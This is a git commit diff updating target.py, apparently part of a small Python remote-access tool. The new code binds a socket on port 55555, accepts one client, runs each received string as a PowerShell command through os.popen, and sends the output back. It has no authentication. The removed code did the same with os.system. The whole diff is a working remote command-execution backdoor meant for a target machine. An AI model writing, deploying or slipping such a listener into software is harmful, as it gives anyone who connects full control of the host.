82a797a48dee942ed4c551cd6e9cc9273885ad2f
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2021-12-28 12:13:50 +0100

    Update target.py

--- py/madeherpreter/target.py
+++ py/madeherpreter/target.py
@@ -5,42 +5,27 @@ import threading
 import socket
 
 host = (socket.gethostbyname(socket.gethostname()))
-
 port = int('55555')
-
 client_list = []
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((host, port))
 server.listen()
+client, address = server.accept()
+print(address)
 
-def sending(response):
-    for client in client_list:
-        client.send(response)
-
-
-def command(it):
-    response = os.system(f'{it}')    
-    sending(response)
-
-def handle(client):
+def reciv():
     while True:
         try:
             it = client.recv(3072)
-            command(it)
-            
+            it = it.decode('utf-8')
+            commandum = (f'powershell /c {it}')
+            result = os.popen(commandum).read()
+            print (result)
+            result = result.encode()
+            client.send(result)
         except:
-            print("Error")
-            server.close()
+            client.close()
+            print ("An error occured!!!")
 
-def main():
-    while True:
-        client, address = server.accept()
-        client_list.append(client)
-        print (f"\nNew user connected at {address}")
-        thread = threading.Thread(target=handle, args=(client,))
-        thread.start()
-
-print(f"Server running on {host}, {port}")
-
-main()
+reciv()
